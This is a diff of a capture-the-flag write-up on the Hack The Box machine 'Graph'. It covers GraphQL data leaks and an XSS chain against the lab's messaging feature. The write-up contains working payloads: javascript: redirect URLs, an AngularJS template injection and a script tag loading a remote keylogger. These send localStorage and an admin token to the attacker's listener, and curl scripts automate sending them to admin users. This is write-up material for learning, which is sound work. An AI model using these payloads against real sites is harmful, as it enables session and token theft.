@@ -261,6 +261,27 @@ Same goes with an update operation:
 "code":"UNAUTHENTICATED"
 ```
 
+Still the tasks can be queried by anyone:
+
+```json
+{
+    "variables": {"username": "Sally"},
+    "query": "query($username: String!){\n tasks(username: $username){\n Assignedto\n username\n text\n taskstatus\n type\n}\n}"
+}
+```
+
+And it leaks user ids:
+
+```json
+{
+    "data": {
+        "tasks": [
+            {"Assignedto": "629a846186ac7d05add16881", "username": null, "text": "Lorem ipsum", "taskstatus": "completed", "type": "development"}]
+    }
+}
+```
+
+
 ## Registering a new user
 
 When registering a new user, the server asks for a OTP. This is done by POSTING
@@ -289,88 +310,25 @@ But once the email is verified, we still have to fill in the user fields. Since 
 The webpage links to length JavaScript files... Looking for "register", "code" and the like I found:
 
 ```javascript
-class t {
-    constructor(n) {
-        this.http = n,
-        this.sendOTP = "false",
-        this.emailVerified = "false",
-        this.result = "",
-        this.email = ""
-    }
-    ngOnInit() {}
-    sendCode(n) {
-        n && ("graph.htb" === n.split("@")[1] ? (this.email = n,
-        this.http.post("http://internal-api.graph.htb/api/code", {
-            email: n
-        }).subscribe(r=>{
-            "User Already Exists" === r.result ? (this.result = r.result,
-            setTimeout(()=>{
-                this.result = ""
-            }
-            , 5e3)) : (this.sendOTP = "true",
-            this.result = r.result,
-            setTimeout(()=>{
-                this.result = ""
-            }
-            , 5e3))
-        }
-        )) : (this.result = "Email must end with @graph.htb",
+registerUser(n, r, i) {
+    this.http.post("http://internal-api.graph.htb/api/register", {
+        email: this.email,
+        password: r,
+        confirmPassword: i,
+        username: n
+    }).subscribe(o=>{
+        "Account Created Please Login!" === o.result && window.location.replace(""),
+        this.result = o.result,
         setTimeout(()=>{
             this.result = ""
         }
-        , 5e3)))
+        , 5e3)
     }
-    verify(n) {
-        this.http.post("http://internal-api.graph.htb/api/verify", {
-            email: this.email,
-            code: n
-        }).subscribe(r=>{
-            "Email Verified" === r.result ? (this.emailVerified = "true",
-            this.result = "Email Verified",
-            setTimeout(()=>{
-                this.result = ""
-            }
-            , 5e3)) : "Invalid Code" === r.result ? (this.result = "Invalid Code",
-            setTimeout(()=>{
-                this.result = ""
-            }
-            , 5e3)) : "Email already verified" === r.result ? (this.result = "Email already verified",
-            setTimeout(()=>{
-                this.result = ""
-            }
-            , 5e3)) : "Invalid email" === r.result ? (this.result = "Invalid email",
-            setTimeout(()=>{
-                this.result = ""
-            }
-            , 5e3)) : "Invalid otp 3 times, please request for new otp" === r.result && (this.result = "Invalid otp 3 times, please request for new otp",
-            setTimeout(()=>{
-                this.result = "",
-                window.location.replace("/register")
-            }
-            , 2e3))
-        }
-        )
-    }
-    registerUser(n, r, i) {
-        this.http.post("http://internal-api.graph.htb/api/register", {
-            email: this.email,
-            password: r,
-            confirmPassword: i,
-            username: n
-        }).subscribe(o=>{
-            "Account Created Please Login!" === o.result && window.location.replace(""),
-            this.result = o.result,
-            setTimeout(()=>{
-                this.result = ""
-            }
-            , 5e3)
-        }
-        )
-    }
+    )
 }
 ```
 
-Which steps through the whole registration process. So the next step is to query `internal-api.graph.htb/api/register`:
+The script steps through the whole registration process. So the next step is to query `internal-api.graph.htb/api/register`:
 
 ```json
 {
@@ -465,31 +423,21 @@ But uploading requires an `adminToken`:
 {"result": "Invalid Token" }
 ```
 
-## User shell
+## Getting admin credentials on the web portal
 
-Since we can message "Mark", there may be a way to gain his token.
+### Triggering the payload
 
-```json
-"message":"Cannot read property 'username' of null"
-```
-
-Let's update the profile and add "username", "lastname" etc:
+Since we can message "Mark", there may be a way to gain his token. Let's poke Larry / Mark / James with a link to our server:
 
 ```json
-{"operationName":"update","variables":{"firstname":"ape","lastname":"hex","id":"628b5134f4981e04372005d5","newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}"}
-```
-
-Poke Larry / Mark / James with a link to our server:
-
-```json
-{"variables":{"to":"larry@graph.htb","text":"yo Larry!\n<img src=\"http://graph.htb/?redirect=http://10.10.16.4:8888/unlock.html\">"},"query":"mutation ($to: String!, $text: String!) {\n  sendMessage(to: $to, text: $text) {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"}
+{"variables":{"to":"larry@graph.htb","text":"yo Larry!\n<img src=\"http://graph.htb/?redirect=http://10.10.16.4:9999/\">"},"query":"mutation ($to: String!, $text: String!) {\n  sendMessage(to: $to, text: $text) {\n    toUserName\n    fromUserName\n    text\n    to\n    from\n    __typename\n  }\n}"}
 ```
 
 Which they actually follow:
 
 ```
 Ncat: Connection from 10.10.11.157:51338.
-/GET /?%7B%7D HTTP/1.1
+/GET /%7B%7D HTTP/1.1
 Host: 10.10.16.2:9999
 ```
 
@@ -501,37 +449,99 @@ Next, let's try and inject JS directly into the redirect argument:
 http://graph.htb/?redirect=javascript:alert(1)
 ```
 
-And base64 encode the successive payloads:
+Still, I couldn't get the admin token because the execution context must be `internal.graph.htb` and not `graph.htb`.
+
+The localstorage is not shared, and the [technique using `<iframe>`][share-localstorage] tags did not work for me.
+
+I also looked up the author and saw a [blog post about a similar XSS][xss-blogpost], but the keylogger idea is not relevant here.
 
 ```javascript
-javascript:alert(atob("YWxlcnQoMSk"))
-javascript:alert(atob("YWxlcnQoMSk"))
-javascript:alert(atob("ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9Iik"))
-javascript:alert(atob("ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ"))
-javascript:alert(atob("ZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iaHR0cDovL2ludGVybmFsLmdyYXBoLmh0YiI7ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGRvY3VtZW50LmNvb2tpZSkpKQ"))
+var r=document.createElement("script");r.src="http://10.10.16.4:8888/keylogger.js";document.head.appendChild(r);var x=;
+```
+
+### Scripting each step
+
+The whole exfiltration process involves 2 actions.
+
+#### Getting the admin user id
+
+```shell
+bash payloads/get_userid.sh Mark
+# 629a92724c761106406708ca
 ```
 
 ```shell
-echo -n 'document.location.href="http://internal.graph.htb/inbox";await new Promise(r=>setTimeout(r,2000));fetch("http://10.10.16.4:9999/?storage="+btoa(JSON.stringify(localStorage)))' | base64 -w 0
+curl -i -s -k -X $'POST' \
+    -H $'Host: internal-api.graph.htb' \
+    -H $'Content-Type: application/json' \
+    --data-binary $'{\"variables\": {\"username\": \"'"$@"$'\"}, \"query\": \"query($username: String!){\\n tasks(username: $username){\\n Assignedto\\n username\\n text\\n taskstatus\\n type\\n}\\n}\"}' \
+    $'http://internal-api.graph.htb/graphql' |
+    perl -ne $'m#"Assignedto":"([a-fA-F0-9]+)"# && print $1."\n"'
 ```
 
-```
-http://graph.htb/?redirect=javascript:eval(atob(%22ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ%22))
-http://graph.htb/?redirect=javascript:eval(atob("ZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iaHR0cDovL2ludGVybmFsLmdyYXBoLmh0YiI7ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ"))
-http://graph.htb/?redirect=javascript:eval(atob("ZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iaHR0cDovL2ludGVybmFsLmdyYXBoLmh0Yi9pbmJveCI7YXdhaXQgbmV3IFByb21pc2Uocj0+c2V0VGltZW91dChyLDIwMDApKTtmZXRjaCgiaHR0cDovLzEwLjEwLjE2LjQ6OTk5OS8/c3RvcmFnZT0iK2J0b2EoSlNPTi5zdHJpbmdpZnkobG9jYWxTdG9yYWdlKSkp"))
+#### Messaging the admin
+
+First, encode the successive payloads:
+
+```shell
+PAYLOAD=$(echo -n "$@" | base64 -w 0)
+echo 'http://graph.htb/?redirect=javascript:alert(atob("'"${PAYLOAD}"'"));'
 ```
 
-The HTML tag is not interpreted since the requested path contains `%22%3E`, which is `">`.
+For some reason, the "=" padding needs to be removed for JS to decode the payload:
 
-And finally exfiltrate an "adminToken":
+```
+http://graph.htb/?redirect=javascript:alert(atob("ZmV0Y2goImh0dHA6Ly8xMC4xMC4xNi40Ojk5OTkvP3N0b3JhZ2U9IitidG9hKEpTT04uc3RyaW5naWZ5KGxvY2FsU3RvcmFnZSkpKQ"))
+```
+
+It can be pasted in the messaging panel or directly sent:
+
+```shell
+bash payloads/message.sh $'mark@graph.htb' $'alert(1)' $'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyOWE5MzM0NzZlYWM4MDQzOTdjZjcwNiIsImVtYWlsIjoiYXBlaGV4QGdyYXBoLmh0YiIsImlhdCI6MTY1NDI5NzY4MywiZXhwIjoxNjU0Mzg0MDgzfQ.bBRCYXrb9A08CBOzyIWAdZZPZfw7ta0xvF1jyEoScEc'
+```
+
+```shell
+TARGET=$1
+PAYLOAD=$(echo -n "$2" | base64 -w 0)
+COOKIE=$3
+URL=$(echo 'http://graph.htb/?redirect=javascript:eval(atob("'"${PAYLOAD}"'"));')
+curl -i -s -k -X $'POST' \
+    -H $'Host: internal-api.graph.htb' \
+    -H $'Content-Type: application/json' \
+    -b $'auth='"${COOKIE}" \
+    --data-binary $'{\"variables\":{\"to\":\"'"${TARGET}"'\",\"text\":\"'"${PAYLOAD}"'\"},\"query\":\"mutation ($to: String!, $text: String!) {\\n sendMessage(to: $to, text: $text) {\\n toUserName\\n fromUserName\\n text\\n to\\n from\\n __typename\\n }\\n}\"}' \
+    $'http://internal-api.graph.htb/graphql'
+```
+
+### Reading the local storage
+
+The local storage is only accessible from "internal.graph.htb". So we need to inject JS into the user dashboard too. The profile is actually vulnerable:
+
+```javascript
+{{$on.constructor('new Image.src="http://10.10.16.2:9999/?t="+window.localStorage.getItem("adminToken");')()}}
+```
+
+Let's update the profile and add "username", "lastname" etc:
+
+```json
+{"operationName":"update","variables":{"firstname":"ape","lastname":"hex","id":"628b5134f4981e04372005d5","newusername":"apehex"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}"}
+```
+
+### Exfiltrate and admin token
+
+And fi-nal-ly exfiltrate an "adminToken"!..
 
 ```html
 <script>fetch('http://graph.htb/?redirect=http://10.10.16.2:9999/'+JSON.stringify(localStorage));</script>
 ```
+
+## Compromise an OS used
 
 [author-profile]: https://app.hackthebox.com/users/172213
 [disabled-dashboard]: images/disabled-dashboard.png
 [internal-registration]: images/interal-registration.png*
 [local-storage]: images/local-storage.png
 [registration-otp]: images/registration-otp.png
+[share-localstorage]: https://stackoverflow.com/questions/4026479/use-localstorage-across-subdomains
 [upload-form]: images/upload-form.png
+[xss-blogpost]: https://xclow3n.github.io/bugBounty/myFirstBounty.html
